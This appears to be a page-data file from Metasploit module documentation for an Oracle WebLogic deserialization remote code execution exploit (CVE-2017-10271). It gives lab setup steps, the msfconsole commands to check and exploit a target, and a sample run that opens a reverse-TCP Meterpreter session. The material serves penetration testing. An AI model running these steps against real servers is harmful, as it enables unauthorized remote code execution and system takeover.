{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/weblogic_deserialize_asyncresponseservice","result":{"data":{"moduleMetadataJson":{"id":"fd86c705-a192-5fb9-b767-91e12068017a","name":"Oracle Weblogic Server Deserialization RCE - AsyncResponseService ","fullname":"exploit/multi/misc/weblogic_deserialize_asyncresponseservice","description":"An unauthenticated attacker with network access to the Oracle Weblogic Server T3\n        interface can send a malicious SOAP request to the interface WLS AsyncResponseService\n        to execute code on the vulnerable host.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/weblogic_deserialize_asyncresponseservice","documentationSlug":"/modules/documentation/exploit/multi/misc/weblogic_deserialize_asyncresponseservice","referencesSlug":"/modules/references/exploit/multi/misc/weblogic_deserialize_asyncresponseservice"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>CVE-2017-10271 exploits an XML deserialization vulnerability in Oracle WebLogic via the AsyncResponseService component.  The exploit provides an unauthenticated attacker with remote arbitrary command execution.</p>\n<p>Oracle Weblogic runs as a Java-based service in Windows, Linux, and Unix environments.  It is downloadable from Oracle once registered for an account.  For testing vulnerable environments, we used Weblogic 10.3.6 for Ubuntu (<code class=\"language-text\">wls1036_linux32.bin</code>), Weblogic 10.3.6 for Windows (<code class=\"language-text\">wls1036_dev.zip</code>).  For testing a non-vulnerable environment, we used Weblogic 12.2.1.2 (<code class=\"language-text\">fmw_12.2.1.2.0_wls.jar</code>) in combination with a JDK (<code class=\"language-text\">jdk-8u211-windows-x64.exe</code>).</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<h3 id=\"install-the-application\" style=\"position:relative;\"><a href=\"#install-the-application\" aria-label=\"install the application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install the application</h3>\n<ol>\n<li>Install the application using the binaries above, with both a WebLogic server and an admin server.</li>\n<li>When prompted, name the project <code class=\"language-text\">base_domain</code>.</li>\n<li>When prompted, use a development environment instead of a production environment.</li>\n<li>When prompted, keep the default port of TCP/7001.</li>\n<li>When prompted, provide a username and password, and make a note of them.</li>\n<li>Upon completion of the installer, find and execute the admin server.  On Windows: <code class=\"language-text\">C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\startWebLogic.cmd</code>.  On Linux: <code class=\"language-text\">~/Oracle/Middleware/user_projects/base_domain/bin/startWebLogic.sh</code></li>\n<li>You may be prompted for the username and password you generated during the install process.</li>\n<li>Wait for the output: <code class=\"language-text\">&lt;Server state changed to RUNNING.&gt;</code></li>\n</ol>\n<h3 id=\"checking-for-the-vulnerability\" style=\"position:relative;\"><a href=\"#checking-for-the-vulnerability\" aria-label=\"checking for the vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Checking for the vulnerability</h3>\n<ol>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</code></li>\n<li>Configure RHOSTS to the target address, and set RPORT if the default port is not being used.</li>\n<li>Run the <code class=\"language-text\">check</code> method to confirm exploitability.</li>\n<li>Look for the following output:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; check\n[+] 172.16.135.128:8088 - The target is vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h3 id=\"exploiting-the-vulnerability\" style=\"position:relative;\"><a href=\"#exploiting-the-vulnerability\" aria-label=\"exploiting the vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploiting the vulnerability</h3>\n<ol>\n<li>Follow the steps in the previous \"checking\" section.</li>\n<li>Set the operating system of the target (eg. <code class=\"language-text\">set TARGET Windows</code>)</li>\n<li>Configure the payload and payload parameters.</li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong> : Set this to the AsyncResponseService uri, normally it should be <code class=\"language-text\">/_async/asyncresponseservice</code>. You can also set <code class=\"language-text\">VHOST</code> instead to handle virtual hosts.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) &gt; exploit\n\n[*] Started reverse TCP handler on 172.16.135.1:4444 \n[*] Generating payload...\n[*] Sending payload...\n[*] Sending stage (179779 bytes) to 172.16.135.128\n[*] Meterpreter session 1 opened (172.16.135.1:4444 -&gt; 172.16.135.128:49266) at 2019-05-22 14:16:03 -0500\n\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"fd86c705-a192-5fb9-b767-91e12068017a"}}}